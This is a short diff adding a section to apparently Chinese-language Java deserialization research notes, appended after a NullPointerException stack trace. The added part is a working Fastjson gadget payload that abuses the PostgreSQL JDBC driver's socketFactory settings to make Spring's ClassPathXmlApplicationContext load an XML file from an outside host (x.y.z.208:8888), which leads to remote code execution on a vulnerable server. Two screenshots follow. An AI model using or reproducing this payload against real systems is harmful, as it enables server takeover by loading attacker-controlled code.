@@ -584,3 +584,26 @@ Caused by: java.lang.NullPointerException
 	at org.apache.commons.io.output.WriterOutputStream.<init>(WriterOutputStream.java:144)
 	... 25 more
 ```
+
+postgresql的gadget：
+```
+{
+    "@type": "java.lang.AutoCloseable",
+    "@type": "org.postgresql.jdbc.PgConnection",
+    "hostSpecs": [{
+        "host": "127.0.0.1",
+        "port": 2333
+    }],
+    "user": "test",
+    "database": "test",
+    "info": {
+        "socketFactory": "org.springframework.context.support.ClassPathXmlApplicationContext",
+        "socketFactoryArg": "http://x.y.z.208:8888/test.xml"
+    },
+    "url": ""
+}
+```
+![image](https://user-images.githubusercontent.com/30398606/209430315-a2d4bd68-ee07-49ea-856c-c37b8fcb698b.png)
+
+![image](https://user-images.githubusercontent.com/30398606/209432505-cdcdc136-be4f-4e11-b0cd-25acea65a828.png)
+
